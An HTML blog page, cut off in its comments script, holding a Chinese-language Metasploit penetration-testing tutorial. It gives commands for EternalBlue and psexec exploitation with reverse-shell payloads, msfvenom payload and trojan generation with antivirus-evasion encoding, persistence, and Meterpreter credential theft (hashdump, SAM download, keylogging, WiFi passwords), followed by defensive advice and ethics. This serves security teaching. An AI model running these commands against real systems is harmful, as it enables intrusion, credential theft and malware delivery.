@@ -1,0 +1,806 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="https://pic1.imgdb.cn/item/6891f04e58cb8da5c806dce6.jpg">
+  <link rel="icon" href="https://pic1.imgdb.cn/item/6891f04e58cb8da5c806dce6.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="suny">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Metasploit Framework (MSF) 是世界上最流行的渗透测试框架，被安全专业人士广泛用于漏洞评估、渗透测试和网络安全研究。本文将介绍 MSF 的基本概念、核心组件和常用命令，帮助你快速上手这个强大的工具。 Metasploit 简介Metasploit 是一个开源的渗透测试框架，由 Rapid7 公司维护。它提供了：  1700+ 漏洞利用模块 (exploits) 500+ 载">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Metasploit Framework (MSF) 渗透测试工具指南">
+<meta property="og:url" content="http://example.com/2025/08/19/MSF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7%E6%8C%87%E5%8D%97/index.html">
+<meta property="og:site_name" content="suny">
+<meta property="og:description" content="Metasploit Framework (MSF) 是世界上最流行的渗透测试框架，被安全专业人士广泛用于漏洞评估、渗透测试和网络安全研究。本文将介绍 MSF 的基本概念、核心组件和常用命令，帮助你快速上手这个强大的工具。 Metasploit 简介Metasploit 是一个开源的渗透测试框架，由 Rapid7 公司维护。它提供了：  1700+ 漏洞利用模块 (exploits) 500+ 载">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/68abb64258cb8da5c8493bbf.png">
+<meta property="article:published_time" content="2025-08-19T05:55:54.000Z">
+<meta property="article:modified_time" content="2025-11-01T05:36:25.216Z">
+<meta property="article:author" content="suny">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="Metasploit">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/68abb64258cb8da5c8493bbf.png">
+  
+  
+  
+  <title>Metasploit Framework (MSF) 渗透测试工具指南 - suny</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>suny</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://pic.imgdb.cn/item/62c579525be16ec74a579b15.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Metasploit Framework (MSF) 渗透测试工具指南"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        suny
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-19 13:55" pubdate>
+          2025年8月19日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Metasploit Framework (MSF) 渗透测试工具指南</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年11月1日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>Metasploit Framework (MSF) 是世界上最流行的渗透测试框架，被安全专业人士广泛用于漏洞评估、渗透测试和网络安全研究。本文将介绍 MSF 的基本概念、核心组件和常用命令，帮助你快速上手这个强大的工具。</p>
+<h2 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h2><p>Metasploit 是一个开源的渗透测试框架，由 Rapid7 公司维护。它提供了：</p>
+<ul>
+<li>1700+ 漏洞利用模块 (exploits)</li>
+<li>500+ 载荷 (payloads)</li>
+<li>300+ 辅助模块 (auxiliary)</li>
+<li>400+ 后渗透模块 (post)</li>
+</ul>
+<p>支持平台：Windows、Linux、macOS（Kali Linux 已预装）</p>
+<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><h3 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h3><ol>
+<li><strong>Exploit（漏洞利用）</strong> - 针对特定漏洞的攻击代码</li>
+<li><strong>Payload（载荷）</strong> - 攻击成功后执行的代码（如反弹shell）</li>
+<li><strong>Auxiliary（辅助模块）</strong> - 扫描、嗅探、指纹识别等辅助功能</li>
+<li><strong>Encoder（编码器）</strong> - 绕过杀毒软件检测</li>
+<li><strong>Post（后渗透模块）</strong> - 获取系统后的进一步操作</li>
+<li><strong>Listener（监听器）</strong> - 等待目标连接</li>
+</ol>
+<h3 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h3><ul>
+<li><strong>LHOST</strong> - 攻击者的IP地址</li>
+<li><strong>RHOST</strong> - 目标的IP地址</li>
+<li><strong>LPORT</strong> - 攻击者的监听端口</li>
+<li><strong>RPORT</strong> - 目标的端口</li>
+</ul>
+<h2 id="环境配置与启动"><a href="#环境配置与启动" class="headerlink" title="环境配置与启动"></a>环境配置与启动</h2><h3 id="启动-Metasploit"><a href="#启动-Metasploit" class="headerlink" title="启动 Metasploit"></a>启动 Metasploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启动PostgreSQL服务（Kali中通常已自动启动）</span><br><span class="hljs-built_in">sudo</span> systemctl start postgresql<br><br><span class="hljs-comment"># 初始化数据库</span><br>msfdb init<br><br><span class="hljs-comment"># 启动Metasploit控制台</span><br>msfconsole<br></code></pre></td></tr></table></figure>
+
+<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看帮助</span><br><span class="hljs-built_in">help</span><br><br><span class="hljs-comment"># 搜索模块</span><br>search [keyword]<br><br><span class="hljs-comment"># 使用模块</span><br>use [module_path]<br><br><span class="hljs-comment"># 查看模块信息</span><br>info<br><br><span class="hljs-comment"># 显示当前设置</span><br>show options<br><br><span class="hljs-comment"># 设置参数</span><br><span class="hljs-built_in">set</span> [option] [value]<br><br><span class="hljs-comment"># 运行模块</span><br>run 或 exploit<br></code></pre></td></tr></table></figure>
+
+<h2 id="常用模块与命令"><a href="#常用模块与命令" class="headerlink" title="常用模块与命令"></a>常用模块与命令</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描端口</span><br>use auxiliary/scanner/portscan/tcp<br><span class="hljs-built_in">set</span> RHOSTS 192.168.1.0/24<br><span class="hljs-built_in">set</span> PORTS 1-1000<br>run<br><br><span class="hljs-comment"># SMB版本扫描</span><br>use auxiliary/scanner/smb/smb_version<br><span class="hljs-built_in">set</span> RHOSTS 192.168.1.100<br>run<br><br><span class="hljs-comment"># HTTP服务扫描</span><br>use auxiliary/scanner/http/http_version<br><span class="hljs-built_in">set</span> RHOSTS 192.168.1.100<br>run<br></code></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用永恒之蓝漏洞</span><br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> RHOST 192.168.1.100<br><span class="hljs-built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.1.10<br><span class="hljs-built_in">set</span> LPORT 4444<br>exploit<br></code></pre></td></tr></table></figure>
+
+<h3 id="载荷生成"><a href="#载荷生成" class="headerlink" title="载荷生成"></a>载荷生成</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 生成Windows可执行载荷</span><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe &gt; payload.exe<br><br><span class="hljs-comment"># 生成Linux载荷</span><br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf &gt; payload.elf<br><br><span class="hljs-comment"># 生成Android APK</span><br>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 R &gt; payload.apk<br></code></pre></td></tr></table></figure>
+
+<h2 id="渗透测试工作流程"><a href="#渗透测试工作流程" class="headerlink" title="渗透测试工作流程"></a>渗透测试工作流程</h2><h3 id="1-目标识别"><a href="#1-目标识别" class="headerlink" title="1. 目标识别"></a>1. 目标识别</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">db_nmap -sV 192.168.1.0/24<br>services<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 搜索可用漏洞</span><br>search <span class="hljs-built_in">type</span>:exploit platform:windows<br>search cve:2023-1234<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-攻击执行"><a href="#3-攻击执行" class="headerlink" title="3. 攻击执行"></a>3. 攻击执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/psexec<br><span class="hljs-built_in">set</span> RHOSTS 192.168.1.100<br><span class="hljs-built_in">set</span> SMBUser administrator<br><span class="hljs-built_in">set</span> SMBPass Password123<br><span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 192.168.1.10<br>exploit<br></code></pre></td></tr></table></figure>
+
+<h3 id="4-权限提升"><a href="#4-权限提升" class="headerlink" title="4. 权限提升"></a>4. 权限提升</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Meterpreter中执行</span><br>getsystem<br></code></pre></td></tr></table></figure>
+
+<h3 id="5-维持访问"><a href="#5-维持访问" class="headerlink" title="5. 维持访问"></a>5. 维持访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run persistence -X -i 30 -p 4444 -r 192.168.1.10<br></code></pre></td></tr></table></figure>
+
+<h2 id="后渗透阶段（Meterpreter）"><a href="#后渗透阶段（Meterpreter）" class="headerlink" title="后渗透阶段（Meterpreter）"></a>后渗透阶段（Meterpreter）</h2><h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 系统信息</span><br>sysinfo<br><br><span class="hljs-comment"># 当前用户</span><br>getuid<br><br><span class="hljs-comment"># 提升权限</span><br>getsystem<br><br><span class="hljs-comment"># 后台会话</span><br>background<br><br><span class="hljs-comment"># 返回会话</span><br>sessions -i [<span class="hljs-built_in">id</span>]<br><br><span class="hljs-comment"># 获取shell</span><br>shell<br></code></pre></td></tr></table></figure>
+
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 文件浏览</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cd</span><br><br><span class="hljs-comment"># 上传文件</span><br>upload /path/local/file C:\\Windows\\Temp\\file.exe<br><br><span class="hljs-comment"># 下载文件</span><br>download C:\\Windows\\System32\\config\\SAM<br><br><span class="hljs-comment"># 搜索文件</span><br>search -f *.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 屏幕截图</span><br>screenshot<br><br><span class="hljs-comment"># 键盘记录</span><br>keyscan_start<br>keyscan_dump<br>keyscan_stop<br><br><span class="hljs-comment"># 获取密码哈希</span><br>hashdump<br><br><span class="hljs-comment"># 获取WiFi密码</span><br>run post/windows/gather/credentials/wifi<br></code></pre></td></tr></table></figure>
+
+<h3 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 路由表</span><br>route<br><br><span class="hljs-comment"># 端口转发</span><br>portfwd add -l 3389 -p 3389 -r [目标内网IP]<br><br><span class="hljs-comment"># ARP扫描</span><br>run post/windows/gather/arp_scanner RHOSTS=192.168.2.0/24<br></code></pre></td></tr></table></figure>
+
+<h2 id="高级技巧"><a href="#高级技巧" class="headerlink" title="高级技巧"></a>高级技巧</h2><h3 id="绕过杀毒软件"><a href="#绕过杀毒软件" class="headerlink" title="绕过杀毒软件"></a>绕过杀毒软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用编码器</span><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe &gt; payload.exe<br><br><span class="hljs-comment"># 捆绑程序</span><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x legit.exe -f exe -o trojan.exe<br></code></pre></td></tr></table></figure>
+
+<h3 id="多处理器"><a href="#多处理器" class="headerlink" title="多处理器"></a>多处理器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 设置处理器</span><br><span class="hljs-built_in">set</span> PROCESSORS 5<br><br><span class="hljs-comment"># 使用资源脚本</span><br>resource /path/to/script.rc<br></code></pre></td></tr></table></figure>
+
+<h3 id="自动化攻击"><a href="#自动化攻击" class="headerlink" title="自动化攻击"></a>自动化攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建资源脚本</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;use exploit/windows/smb/ms17_010_eternalblue&quot;</span> &gt; attack.rc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;set RHOST 192.168.1.100&quot;</span> &gt;&gt; attack.rc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;set PAYLOAD windows/x64/meterpreter/reverse_tcp&quot;</span> &gt;&gt; attack.rc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;set LHOST 192.168.1.10&quot;</span> &gt;&gt; attack.rc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;set LPORT 4444&quot;</span> &gt;&gt; attack.rc<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;exploit -j&quot;</span> &gt;&gt; attack.rc<br><br><span class="hljs-comment"># 执行资源脚本</span><br>msfconsole -r attack.rc<br></code></pre></td></tr></table></figure>
+
+<h2 id="防御与最佳实践"><a href="#防御与最佳实践" class="headerlink" title="防御与最佳实践"></a>防御与最佳实践</h2><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol>
+<li><strong>及时更新系统</strong> - 修补已知漏洞</li>
+<li><strong>最小权限原则</strong> - 限制用户权限</li>
+<li><strong>网络分段</strong> - 隔离关键系统</li>
+<li><strong>入侵检测系统</strong> - 监控异常活动</li>
+<li><strong>禁用不必要服务</strong> - 减少攻击面</li>
+</ol>
+<h3 id="渗透测试伦理"><a href="#渗透测试伦理" class="headerlink" title="渗透测试伦理"></a>渗透测试伦理</h3><ol>
+<li><strong>获取书面授权</strong> - 未经授权的测试是违法的</li>
+<li><strong>明确测试范围</strong> - 只测试授权目标</li>
+<li><strong>保护客户数据</strong> - 妥善处理敏感信息</li>
+<li><strong>编写详细报告</strong> - 提供修复建议</li>
+<li><strong>清理痕迹</strong> - 测试后删除所有植入物</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Metasploit Framework 是一个功能强大的渗透测试工具集，本文介绍了其核心功能、常用命令和工作流程。要熟练掌握 MSF，需要：</p>
+<ol>
+<li>理解渗透测试的基本原理</li>
+<li>熟悉各种模块的使用方法</li>
+<li>掌握 Meterpreter 的高级功能</li>
+<li>遵守职业道德和法律法规</li>
+</ol>
+<p>记住：<strong>能力越大，责任越大</strong>。Metasploit 应在合法授权和道德约束下使用，用于提高系统安全性而非非法入侵。</p>
+<h3 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.offensive-security.com/metasploit-unleashed/">Metasploit Unleashed</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.metasploit.com/">Metasploit 官方文档</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.rapid7.com/">Rapid7 博客</a></li>
+<li>Kali Linux 培训课程</li>
+</ul>
+<div class="note note-success">
+            <p>本文由DeepSeek总结，请确保在合法授权下使用这些技术。未经授权的系统访问是违法行为。</p>
+          </div>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E5%AE%89/" class="category-chain-item">网安</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+        <a href="/tags/Metasploit/" class="print-no-link">#Metasploit</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Metasploit Framework (MSF) 渗透测试工具指南</div>
+      <div>http://example.com/2025/08/19/MSF渗透测试工具指南/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>suny</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年8月19日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/19/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94MSF/" title="网安学习笔记——MSF">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">网安学习笔记——MSF</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/08/16/%E6%88%91%E7%9A%84%E4%B8%83%E5%B9%B4%E5%BB%BA%E7%AB%99%E4%B9%8B%E8%B7%AF%EF%BC%9A%E4%BB%8E%E5%88%9D%E5%85%A5%E6%B1%9F%E6%B9%96%E5%88%B0%E7%AB%99%E7%82%B9%E7%BB%88%E6%88%90/" title="我的七年建站之路：从初入江湖到站点终成">
+                        <span class="hidden-mobile">我的七年建站之路：从初入江湖到站点终成</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
